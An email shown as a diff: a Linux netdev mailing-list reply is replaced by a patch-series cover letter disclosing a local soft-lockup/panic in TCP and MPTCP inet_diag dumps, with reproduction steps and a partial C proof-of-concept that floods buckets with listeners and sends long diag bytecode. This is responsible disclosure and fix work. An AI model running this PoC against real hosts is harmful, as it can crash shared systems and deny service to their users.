@@ -1,119 +1,990 @@
-Received: from mail-pg1-f176.google.com (mail-pg1-f176.google.com [209.85.215.176])
+Received: from mail-pl1-f170.google.com (mail-pl1-f170.google.com [209.85.214.170])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6180A3A6EF1
-	for <netdev@vger.kernel.org>; Tue,  1 Sep 2026 12:51:28 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.176
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788267089; cv=pass; b=t9gESR/4otyGAcXlwt/NCJMAWGZbVmifxmf4NW/IL5fQ/U6USdDycKJlTQRQys75PJP7HrndBbWodw31t1lGnyqIfiZWyXjk16S4he6eKHUbLG9qxjakBW7ixFYZjP1V3EFtSTYe22UKN4U7GhKwQSPkksgJNispIm0HQ8u2e3w=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788267089; c=relaxed/simple;
-	bh=zkSL/F7B47mfagP4g1AKTiiFQpy9Jb+QcrEEKKNEnrM=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=AGanGBZWHhC31HAN2kJlSyi1zDneqPo5Rk+ZZfrhcm0zGsgsa0qjlAyJWg6+8cjr3WojAHB8S+fdQgQrGbpT+/7VbESkg5tzbRBV6uLfifnsUIs32J8y2AXZD90YxUIVpCVT3WsLr1yjaWRUWiiw7DHg5QZIrT/qZ/vbP2Vn1rs=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ZqvevHhR; arc=pass smtp.client-ip=209.85.215.176
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 921763C4174
+	for <netdev@vger.kernel.org>; Tue,  1 Sep 2026 12:53:58 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.170
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1788267242; cv=none; b=iM7Kj2Uy3PeT/+irsVvU7FpYmod25oMUskkErOWvf8aHLZ9I1ZAQ/ch1CwE8yQuiuC7sAfEE10bjWJZHXvS6y+u8ashlgp0Ni7v/RXrNMrGpl/UI0wC+qndwyGUDtCKwKDZk3Hgigtgv4Oiu25UtsyjqbGULhdO9mMtOJ7HKUfY=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1788267242; c=relaxed/simple;
+	bh=sND930BaN1YSZUPlMw4zZXrC+wbowFNkvgouGe/dvvY=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=BqKbX0xUp2sZ+8el+JZ0IiRBikQv2HlglGc4jKKDugffvAaS+SPA8CULY74Y7kxfRqeaxkGSZ5JgeIdjzfrYDmTJxJ+wgqySnf2Ga9ucnaoqPMEIWFOhhlU70MiNmGHFUxYQBRVOF914UwTmZ98OiiqCD/TSl/xsLCpxppJf1Ec=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=KfF6YYZ3; arc=none smtp.client-ip=209.85.214.170
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ZqvevHhR"
-Received: by mail-pg1-f176.google.com with SMTP id 41be03b00d2f7-cbe41618110so808387a12.2
-        for <netdev@vger.kernel.org>; Tue, 01 Sep 2026 05:51:28 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1788267087; cv=none;
-        d=google.com; s=arc-20260327;
-        b=IdchRUjaiFvjPCbpLaqYyVDazuwU902kSH1UOrAASUjA1OwwV2weq7ATwaokXCKC0M
-         G3D/cTIYoHDJJR75eSaMenEbn+u26SUn0+jNv9XF/ahuW2O48rNoWIj06Q8zYfGDT8sX
-         cr3BHPMjWjVUzQ4V1CJeSjEiB9ShkYqDl45D5QZFE3zKWL3RUUM9x/xCYfuHgUYIQUNC
-         mcwF7K687k+oLnDx9M63VU+p03/fu0Y3W0w5Xu0LJ6E4GMaoAOACzUGGOv4LR0sTJnAq
-         FYIArdKf+97CVi2AIneI+HUsqZPy2p1okb2UvkGJnpIFrNsRvQI/BZON6WDoJEoLFInv
-         XLaA==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=zkSL/F7B47mfagP4g1AKTiiFQpy9Jb+QcrEEKKNEnrM=;
-        fh=sW3gn7jHI7Hk6jbBWBRjqLH17mMI/nX36A7inUVq5o0=;
-        b=ZZwqvWfImDQ8E+RV2x/cY76nhjERl8P8UeQUSD2dlAHpiUGKLYZH0dvMlSboLw88wf
-         1yYOCWHwJ/eJwCplQUwtjkuX3GX02Psdkn6ZOkYtHpIWGHUvoWMp4pUUGBZRQ/boV3sL
-         8vGB359O74hgjW/KXbSG4WSBDDohhIVVkFuKVSr2FmPT/GgGqeb0N+q++ZPlm1yzrQYi
-         j3PBdpu4AWH1M6R8gllicI2c42GKJyhTCsFwl4Ynf5Q/eq6aqA3kqKO6UruSu1f8hOze
-         vKSsrnnC/mmo0nquw941Bxy38WP8JYCM1EKYKTPPY/j/PCuvTF0xmfPU43LskaCJq0rS
-         ukkw==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="KfF6YYZ3"
+Received: by mail-pl1-f170.google.com with SMTP id d9443c01a7336-2d94c868ea5so13207465ad.3
+        for <netdev@vger.kernel.org>; Tue, 01 Sep 2026 05:53:58 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1788267087; x=1788871887; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=zkSL/F7B47mfagP4g1AKTiiFQpy9Jb+QcrEEKKNEnrM=;
-        b=ZqvevHhRPih9Z/ZZWEWxEtQfTSSZ7lqDEGJuyOktUWysYTJ8cOpKRtCD95Zjjz00qf
-         qrqPHyl/GJinRA0ldpjnQByQLC2ijRNclc5kBV9jtHiuy+WmWZchYHq1cySBjfOgM8PF
-         dRh5viOXmf8PfX7KSCPHXkXbzyIYMc72m8JCoYV2jRJ7mqO6q+QlWul0m/cL6CfFGuFF
-         2ipWJV6GnuWfMNtw9Ed9RGadsnhqDytJmAuNzVb/4hACi1mvnL1tKXt3VB4nPRmBylFy
-         LBtvUGox4vq2UctToFVhbGjDtfnxFBWE+vinWOQhA2qSW2YJaNIMd/jI5Ch0qU8JGKqB
-         cKpg==
+        d=nebusec.ai; s=google; t=1788267238; x=1788872038; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=oKY0aJXyYQMDd6t8EsN4rb8UxM9MgZjFhRhMO7hu9wI=;
+        b=KfF6YYZ3wzCU8dcpIUAlGwFK0YeKwaywsWVdEo7t7upph/H0btJMHneYqT3CeFSugY
+         xNrQ4KukhXIdcYhyip/eLcZwBMeey5AKM0IcbqNaJ7EEu7pinSWuTEgBbM6lNkuYMbGj
+         ermwF+guxsqA+py8HUCDNVVq/+myrxhguDriaSlza4PZ/WuoLC0MXduIf7cIT4bKav8l
+         T+HPcTW/igP1OP4OEJIbQsdvgQ2kEgpQqIbCptOTELwNjaUk2tD/y8OgNbyABwb7hze/
+         367KMo76EooRIyM72f8JkvpZQBOd3J1HKwe2Ls2InsfAlWZZB/QJom3A4nE7XaBaH05u
+         t7Ng==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1788267087; x=1788871887;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=zkSL/F7B47mfagP4g1AKTiiFQpy9Jb+QcrEEKKNEnrM=;
-        b=EOrbuFqo+nfV+YzPyF+JnegGA7xe3GPrk+52HCsfyS/UkJQ5tOIA9O1xrVf9ITdhXK
-         fWkWwSfvsYwsZK3UaJ4bnQOy+S7IkATPtt4Cv5eVbXNWN5GXWhz7JOpYIse1ko2WRPkQ
-         Vc4arToCY3612gXHjw0eyf2baf0xe/s7dKZXW+0BaYd2o9mP8XDrNXbG0T/BIT0hoLIQ
-         rdKOPmtVrSyAASFY1n4o30VXkzQTepj1U5FZBsFzzNvxLTrSdhzQRtc3rFlrEW93siGR
-         YHRo7ZsQ/3USzcZTQv6BctSHWbzdaMuVDVOZwJeWMj0vXo6T2cuyH2BVnbYI3sI9zKQq
-         eb2g==
-X-Forwarded-Encrypted: i=1; AKwUvBxBWf7gIs/scm8ygsCtsyUvspBtUgC8tqUTIQVsg1xc7j1NsWpWNrhdxdFILkES9AlLLcRBh14=@vger.kernel.org
-X-Gm-Message-State: AFuF++lGp30US+FcakG15u8YJtnQtAbrazRmprV7K/e14DQ/SCoZlkCJ
-	2t8z6eOWUUacZP/0UiRkqbUuhhOaOUwuuwIF+zSxeKIksxVRoxTM9j779pJmD0t2umBTrrSCZio
-	0DD7cKsgnSfF59jKJGCy8l1dkVu2TQXI=
-X-Gm-Gg: AYBFou34mhgdMOGDg9QXpfqyIVQ1g39HP6xXdn543uVgmrkgCNSoo36vTBmOZ+WsHH+
-	wWKULKBuRTK6J7Miy1DZ4AG2ibcwow3AdPefu/PDGR2NoDrLsV5EPbXjymMOgnf0hVIhgcCdehf
-	yx6qOEX7/o5wCTCXVVMV6X7RubZAhXsNNxgkhN+ifWuqKe7itl+VAAVmORNqSKvdBaotVr2WJMQ
-	9gOxhqiUT5w0Dk3fDauakLOQSkfLBsP0/lNXygXNVclut2NVo0P6WKP5/pB/iafv2FZgREovB+j
-	LvF2Dh1zOP9IEV7keKtd5nVRgvrTPTAjjr5mf177uIWX7G5tnrBBMh0a4/swEr9uhSvuNqVfxdE
-	9QwzAqGn7nLT+Y7vHeCst/WmlyjLbbgHOaYAQUiqmLjRzp0EAEyoP2jEzD1Oi
-X-Received: by 2002:a17:90b:17c3:b0:398:bada:832b with SMTP id
- 98e67ed59e1d1-398bada8463mr19308227a91.6.1788267087455; Tue, 01 Sep 2026
- 05:51:27 -0700 (PDT)
+        d=1e100.net; s=20251104; t=1788267238; x=1788872038;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=oKY0aJXyYQMDd6t8EsN4rb8UxM9MgZjFhRhMO7hu9wI=;
+        b=g+4LVnvFGYAGCFdeNtQmFT4qWJW/sk4Wx5Bve/7N/yiVWk0kCmh0llHQdvJn0paAkX
+         qsLAGbC5DoVGhPPqO9gqf/sWgJz2T1gm5NDklKtPCjJMFXHZyeqdjuqZVz1x8htH4M93
+         i+2qv2JxFOjVcgkcN1NU8d1+lSv4s7wAoWVRi+k26MZt2xMPwgWGQchsf7Ge9zm5teSn
+         aKvci6WXjr69NNQIsfwBFoa7hQq+6aiYArg58+XMn6T29L+SPuK+j5HbP5unbms7uacW
+         Ij5pFiYD4WTHVcXncu5+Mm7TJXNs3cAtygMWLVwRlBzox/gvy6q/+DNwKVLPcFkMbuUA
+         p6SQ==
+X-Gm-Message-State: AFuF++n958BqV4jxbLhqegVzrmVyehLKD8pWLRxwoSdtiaoxRxMebAdQ
+	RzjrSrC+8a3rWenUQicLaMTC98lsXGxI42mWWqFSrB2J7dEi306547a3oSEpkUX9VwnCl7Fa2GC
+	ye/C+spVxv1s=
+X-Gm-Gg: AR+sD13jofs8uvPBArhjsRKB2EvkQcfDxWLFa3Qf2EVeLlCInU2yun5OhAn/H1Y72G+
+	TdZ0RuWM/lfwVU5D8oW8SKvcxaeiCZf6sLGmf5gmoTJXwR4xPbzo+LL3DIRP5/5zi0W5EQ5pAFI
+	8s7SVlo0FNwYawR+gL/UIKa75TwDpgk69iotoO1C+TT0uyCNxMSeDn/ePaaSBP/EpeoJ30x7ykH
+	Ag5HEo1P0K8PyVyiG9jyLoiixaQmbRoE4vzFxUpyBm67MONItQGgtIiwdMIEGOr16jZitHuthv6
+	vUS5QoLsEKOZOMwV+QWLVEadXjRJh98Onlb7dInNod68Xmh9nuYiLZlVdJImH7/whCFOL+uGSOj
+	x+MvX56qdQZHEWwGhMbZrMf43828GZx9x4RQvUU4Nh82foEGfh7nYsBjEUVIYYC9rLsvhIcU8ep
+	U+1noAcQCYb/8rOGq9Jjk8SIgorECWDNfX6mcatWPCokJPgbYw0bsABXgUrMwS8Cffi+yh4F2Pa
+	dFGLka5S6Mkf/VSFDY=
+X-Received: by 2002:a17:902:f78b:b0:2c9:df1b:e948 with SMTP id d9443c01a7336-2d74dc78debmr528832585ad.4.1788267237469;
+        Tue, 01 Sep 2026 05:53:57 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d759869c96sm51184175ad.40.2026.09.01.05.53.52
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Tue, 01 Sep 2026 05:53:56 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org
+Cc: Zihan Xi <zihanx@nebusec.ai>,
+	linux-kernel@vger.kernel.org,
+	mptcp@lists.linux.dev,
+	"David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	Neal Cardwell <ncardwell@google.com>,
+	Kuniyuki Iwashima <kuniyu@google.com>,
+	Matthieu Baerts <matttbe@kernel.org>,
+	Mat Martineau <martineau@kernel.org>,
+	Geliang Tang <geliang@kernel.org>,
+	Guillaume Nault <gnault@redhat.com>,
+	Florian Westphal <fw@strlen.de>
+Subject: [PATCH net v2 0/2] tcp: diag: bound bucket lock hold in diag dump paths
+Date: Tue,  1 Sep 2026 12:53:45 +0000
+Message-ID: <cover.1788248601.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260901031824.1377498-1-springbreeze@stu.pku.edu.cn>
- <DL3YRAXKKEEI.GOGNVOO3AV02@garyguo.net> <c4740d62-6d51-462a-9d47-0af8477d39e7@lunn.ch>
-In-Reply-To: <c4740d62-6d51-462a-9d47-0af8477d39e7@lunn.ch>
-From: Miguel Ojeda <miguel.ojeda.sandonis@gmail.com>
-Date: Tue, 1 Sep 2026 14:51:12 +0200
-X-Gm-Features: AcwNN1Wezo3mACTAKMu_Q5y0Y2CqgBBUBpNqp2vbnQUgiNLHKhzdgS-L_bRKqgw
-Message-ID: <CANiq72mXDgdFXy6w1qy=fewJwrjV6ognGrTgNkn_O6zVpzbgYw@mail.gmail.com>
-Subject: Re: [PATCH net v4] rust: net: phy: fix off-by-one bit positions in
- device status accessors
-To: Andrew Lunn <andrew@lunn.ch>, Greg KH <gregkh@linuxfoundation.org>, 
-	Sasha Levin <sashal@kernel.org>
-Cc: Gary Guo <gary@garyguo.net>, Chunfeng Song <springbreeze@stu.pku.edu.cn>, 
-	netdev@vger.kernel.org, rust-for-linux@vger.kernel.org, 
-	fujita.tomonori@gmail.com, kuba@kernel.org, ojeda@kernel.org, 
-	boqun@kernel.org, hkallweit1@gmail.com, stable@vger.kernel.org
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
 
-On Tue, Sep 1, 2026 at 2:48=E2=80=AFPM Andrew Lunn <andrew@lunn.ch> wrote:
->
-> Probably a FAQ, but what is the policy about toolchain versions for
-> stable kernels?
+Hi Linux kernel maintainers,
 
-As far as I understand it, we are supposed to avoid changes unless
-they are truly needed.
+We found and validated an issue in net/ipv4/tcp_diag.c and
+net/mptcp/mptcp_diag.c. The bug is reachable by a
+non-root user via user and net namespace.
+Our testing did not identify any impact on other functionality.
 
-So there can be exceptions, but I doubt we can easily change a minimum
-version without breaking a lot of users (e.g. distributions or users
-using those distributions that have a particular version provided).
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-But Cc'ing stable just in case.
+---- details below ----
 
-Cheers,
-Miguel
+Bug details:
+
+inet_diag TCP dumps currently execute request-supplied
+INET_DIAG_REQ_BYTECODE programs while still holding the listener, bind,
+or ehash bucket locks in tcp_diag_dump(). With a heavily populated
+bucket, the time spent under the same lock grows with both raw socket
+traversal and bytecode cost.
+
+The local listener reproducer creates four SO_REUSEPORT groups of 32768
+listeners each, 131072 sockets in total, and then issues a
+NETLINK_SOCK_DIAG dump request with 16380 INET_DIAG_BC_NOP instructions
+followed by a failing INET_DIAG_BC_D_EQ test. This is a deliberately
+concentrated setup to make the lock scope observable; it is not intended
+to represent a typical deployment. Because every socket runs the full
+bytecode and none reaches the reply fill path, skb backpressure does not
+terminate the walk early.
+On the unfixed kernel, with local softlockup panic sysctls enabled, this
+makes the long bucket-locked section visible as a watchdog report and
+panic in inet_diag_bc_sk().
+
+The earlier batching fix direction was still too narrow: it only counted
+sockets that survived the cheap prefilters and reached the expensive dump
+path. An attacker can therefore populate one bucket with many sockets or
+listeners that fail the netns/family/port or MPTCP-specific prefilters,
+causing the same bucket lock to be scanned far past the 16-entry batch
+threshold before control is returned.
+
+The same root cause also exists in MPTCP listener dumping. The
+MPTCP-specific mptcp_diag_dump_listeners() path reuses sk_diag_dump(),
+which runs inet_diag_bc_sk() before filling the netlink reply, while the
+listener bucket lock is still held.
+
+The inline reproducer and decoded crash log below cover the TCP watchdog
+path only. They are not an MPTCP crash reproduction. The crash log is the
+decoded output of `./scripts/decode_stacktrace.sh`, with source paths
+reduced to repository-relative file and line references for review. The
+MPTCP patch addresses the equivalent listener lock scope identified by
+code inspection and completed MPTCP listener stress tests. A separate
+MPTCP crash artifact is not included, because the fixed MPTCP run
+completed without a crash.
+
+This series fixes both sites by keeping bucket-locked sections limited to
+raw socket collection and lifetime pinning, and moving all filtering,
+inet_diag_bc_sk(), and socket filling work out of the locked regions so
+the batch limit applies to raw bucket traversal itself. For TCP listener,
+bind, and ehash buckets, and for the MPTCP listener bucket, restarts now
+keep a referenced dump cursor so the next batch resumes after the
+previous socket instead of rescanning the bucket head under the same
+lock. A stored cursor is reused only after it is checked against the
+currently locked bucket. Listen and ehash resume also require the socket
+state to still belong to that table. Current-bucket membership is inferred
+from that state plus the recomputed hash slot. If the check fails,
+collection restarts from the bucket head with the same batch limit. That
+fallback can emit a socket more than once, but it does not move bytecode
+or fill work back under the bucket lock. Bind collection counts TIME_WAIT
+nodes toward the batch limit and restores them through tw_tb2.
+
+We also ran targeted cursor-resume stress tests on the fixed kernel. The
+TCP listener workload used 131072 listeners while a separate thread
+repeatedly removed and recreated listeners across listener buckets. Three
+runs completed in 17024.089 ms, 17217.245 ms, and 17180.322 ms, and the
+guest remained alive. With temporary kernel instrumentation, one run
+directly observed an invalid TCP listener cursor: the cursor was unhashed
+and its computed bucket differed from the bucket being scanned, after
+which the safe restart path completed normally.
+
+A corresponding MPTCP listener workload and a TCP bound-only close/rebind
+workload also completed without a crash, and the guest remained alive.
+Neither workload deterministically reached its instrumented invalid-cursor
+branch, and no crash artifact is claimed for either path.
+
+For ehash, a dedicated workload created 4096 loopback established TCP
+connections while a mutator replaced connection pairs concurrently. The
+TCPF_ALL inet_diag dump completed in 315.108 ms. No ehash invalid-cursor
+log, soft lockup, or panic was observed. These tests exercise the relevant
+mutation and resume paths, but do not claim deterministic scheduling of
+every race between two dump callbacks.
+
+The TCP patch uses two Fixes tags for the path-specific introductions:
+commit 5caea4ea7088 ("net: listening_hash get a spinlock per bucket")
+introduced the listener bucket spinlock, and commit 91051f003948
+("tcp: Dump bound-only sockets in inet_diag.") introduced the bound-only
+path. The ehash dump already ran diagnostic work under the bucket lock
+before 7e3aab4a9cd7, which only converted that lock from read_lock_bh()
+to spin_lock_bh(), so that commit is not used as a Fixes tag. The MPTCP
+patch uses commit 4fa39b701ce9 ("mptcp: listen diag dump support").
+
+udp_diag and raw diag still run bytecode and fill under their own hash
+slot locks. Those locks are not the TCP listener, bind, or ehash locks,
+or the MPTCP listener lock, tightened by this series.
+
+Reproducer:
+
+    gcc -O2 -static -o poc poc.c
+    unshare -Urn ./poc
+
+This is not a packet-sequence or protocol-state reproducer. The trigger
+depends on creating many sockets and issuing NETLINK_SOCK_DIAG requests,
+which packetdrill cannot express, so the PoC uses sockets and Netlink
+directly.
+
+To make the long bucket-locked section observable in the local QEMU
+run below, we enabled softlockup panic sysctls as guest root. The
+unshare command above uses the PoC defaults, which are:
+
+    ./poc --listen --groups 4 --stride 2048 --count 32768 --nops 16380
+
+The crash log reports UID: 0 because that process is the userns root
+created by unshare -Urn, after those sysctls were set as guest root.
+That UID does not by itself prove a host-unprivileged run. The inet_diag
+dump path itself is reachable from a user and net namespace.
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/inet_diag.h>
+#include <linux/netlink.h>
+#include <linux/sock_diag.h>
+#include <linux/tcp.h>
+#include <sched.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <time.h>
+#include <unistd.h>
+
+#ifndef SOL_TCP
+#define SOL_TCP 6
+#endif
+
+#ifndef TCP_LISTEN
+#define TCP_LISTEN 10
+#endif
+
+#define TCPF_LISTEN (1U << TCP_LISTEN)
+
+#ifndef TCP_BOUND_INACTIVE
+#define TCP_BOUND_INACTIVE 13
+#endif
+#ifndef TCPF_BOUND_INACTIVE
+#define TCPF_BOUND_INACTIVE (1U << TCP_BOUND_INACTIVE)
+#endif
+
+#define DEFAULT_SOCKETS 32768U
+#define DEFAULT_NOPS 16380U
+#define DEFAULT_REPEAT 1U
+#define DEFAULT_GROUPS 4U
+#define DEFAULT_STRIDE 2048U
+#define DEFAULT_BASE_PORT 10000
+#define MAX_NOPS 16380U
+#define RECV_BUF_SIZE (1U << 20)
+
+struct options {
+	unsigned int sockets;
+	unsigned int nops;
+	unsigned int repeat;
+	unsigned int groups;
+	unsigned int stride;
+	unsigned int cpu;
+	bool cpu_set;
+	bool compare;
+	bool attack;
+	bool listen_mode;
+	int port;
+};
+
+static void usage(const char *prog)
+{
+	fprintf(stderr,
+		"Usage: %s [--count N] [--nops N] [--repeat N] [--port P] [--cpu N]\n"
+		"          [--groups N] [--stride N] [--compare] [--no-attack]\n"
+		"          [--listen | --bound]\n"
+		"Defaults: --count %u --nops %u --repeat %u\n",
+		prog, DEFAULT_SOCKETS, DEFAULT_NOPS, DEFAULT_REPEAT);
+}
+
+static long long timespec_delta_ns(const struct timespec *start,
+				       const struct timespec *end)
+{
+	return (end->tv_sec - start->tv_sec) * 1000000000LL +
+	       (end->tv_nsec - start->tv_nsec);
+}
+
+static int raise_nofile_limit(rlim_t needed)
+{
+	struct rlimit lim;
+
+	if (getrlimit(RLIMIT_NOFILE, &lim) < 0) {
+		perror("getrlimit(RLIMIT_NOFILE)");
+		return -1;
+	}
+
+	if (lim.rlim_cur >= needed)
+		return 0;
+
+	if (lim.rlim_max < needed)
+		needed = lim.rlim_max;
+
+	lim.rlim_cur = needed;
+	if (setrlimit(RLIMIT_NOFILE, &lim) < 0) {
+		perror("setrlimit(RLIMIT_NOFILE)");
+		return -1;
+	}
+
+	if (getrlimit(RLIMIT_NOFILE, &lim) < 0) {
+		perror("getrlimit(RLIMIT_NOFILE)");
+		return -1;
+	}
+
+	if (lim.rlim_cur < needed) {
+		fprintf(stderr, "RLIMIT_NOFILE stayed at %llu, need %llu\n",
+			(unsigned long long)lim.rlim_cur,
+			(unsigned long long)needed);
+		return -1;
+	}
+
+	return 0;
+}
+
+static int pin_to_cpu(unsigned int cpu)
+{
+	cpu_set_t set;
+
+	CPU_ZERO(&set);
+	CPU_SET(cpu, &set);
+	if (sched_setaffinity(0, sizeof(set), &set) < 0) {
+		perror("sched_setaffinity");
+		return -1;
+	}
+
+	return 0;
+}
+
+static int create_socket_in_bucket(bool listen_mode, int port, int *bound_port)
+{
+	struct sockaddr_in addr = {
+		.sin_family = AF_INET,
+		.sin_addr.s_addr = htonl(INADDR_ANY),
+	};
+	socklen_t addrlen = sizeof(addr);
+	int one = 1;
+	int fd;
+
+	fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+	if (fd < 0) {
+		perror("socket(AF_INET, SOCK_STREAM)");
+		return -1;
+	}
+
+	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0) {
+		perror("setsockopt(SO_REUSEADDR)");
+		goto err;
+	}
+
+	if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one)) < 0) {
+		perror("setsockopt(SO_REUSEPORT)");
+		goto err;
+	}
+
+	addr.sin_port = htons(port);
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+		perror("bind");
+		goto err;
+	}
+
+	if (getsockname(fd, (struct sockaddr *)&addr, &addrlen) < 0) {
+		perror("getsockname");
+		goto err;
+	}
+
+	if (listen_mode) {
+		if (listen(fd, 0) < 0) {
+			perror("listen");
+			goto err;
+		}
+	}
+
+	*bound_port = ntohs(addr.sin_port);
+	return fd;
+
+err:
+	close(fd);
+	return -1;
+}
+
+static int setup_sockets(bool listen_mode, unsigned int groups,
+			 unsigned int count_per_group, unsigned int stride,
+			 int requested_port, int **fds_out, int *port_out)
+{
+	int *fds;
+	unsigned int g, i;
+	unsigned int total = groups * count_per_group;
+	int base_port = requested_port ? requested_port : DEFAULT_BASE_PORT;
+
+	fds = calloc(total, sizeof(*fds));
+	if (!fds) {
+		perror("calloc(socket fds)");
+		return -1;
+	}
+
+	for (g = 0; g < groups; g++) {
+		int port = base_port + (int)(g * stride);
+
+		if (port <= 0 || port > 65535) {
+			fprintf(stderr, "port overflow for group %u (base=%d stride=%u)\n",
+				g, base_port, stride);
+			goto err;
+		}
+
+		for (i = 0; i < count_per_group; i++) {
+			unsigned int idx = g * count_per_group + i;
+			int bound_port = port;
+			int fd = create_socket_in_bucket(listen_mode, bound_port,
+							 &bound_port);
+
+			if (fd < 0) {
+				fprintf(stderr,
+					"socket setup failed at group %u index %u (port %d)\n",
+					g, i, port);
+				goto err;
+			}
+
+			fds[idx] = fd;
+			if ((idx + 1) % 4096U == 0 || idx + 1 == total) {
+				printf("sockets_ready=%u group=%u port=%d mode=%s\n",
+				       idx + 1, g + 1, port,
+				       listen_mode ? "listen" : "bound");
+			}
+		}
+	}
+
+	*fds_out = fds;
+	*port_out = base_port;
+	return 0;
+
+err:
+	for (i = 0; i < total; i++) {
+		if (fds[i] > 0)
+			close(fds[i]);
+	}
+	free(fds);
+	return -1;
+}
+
+static void teardown_sockets(int *fds, unsigned int count)
+{
+	unsigned int i;
+
+	if (!fds)
+		return;
+
+	for (i = 0; i < count; i++) {
+		if (fds[i] >= 0)
+			close(fds[i]);
+	}
+	free(fds);
+}
+
+static size_t build_request(void *buf, bool listen_mode, bool with_attack,
+			    unsigned int nops)
+{
+	size_t msg_len = NLMSG_SPACE(sizeof(struct inet_diag_req_v2));
+	struct nlmsghdr *nlh = buf;
+	struct inet_diag_req_v2 *req;
+
+	memset(buf, 0, msg_len);
+	nlh->nlmsg_len = msg_len;
+	nlh->nlmsg_type = SOCK_DIAG_BY_FAMILY;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
+	nlh->nlmsg_seq = 1;
+
+	req = NLMSG_DATA(nlh);
+	req->sdiag_family = AF_INET;
+	req->sdiag_protocol = IPPROTO_TCP;
+	req->idiag_states = listen_mode ? TCPF_LISTEN : TCPF_BOUND_INACTIVE;
+	req->id.idiag_cookie[0] = INET_DIAG_NOCOOKIE;
+	req->id.idiag_cookie[1] = INET_DIAG_NOCOOKIE;
+
+	if (with_attack) {
+		size_t payload_len = ((size_t)nops + 2U) *
+				     sizeof(struct inet_diag_bc_op);
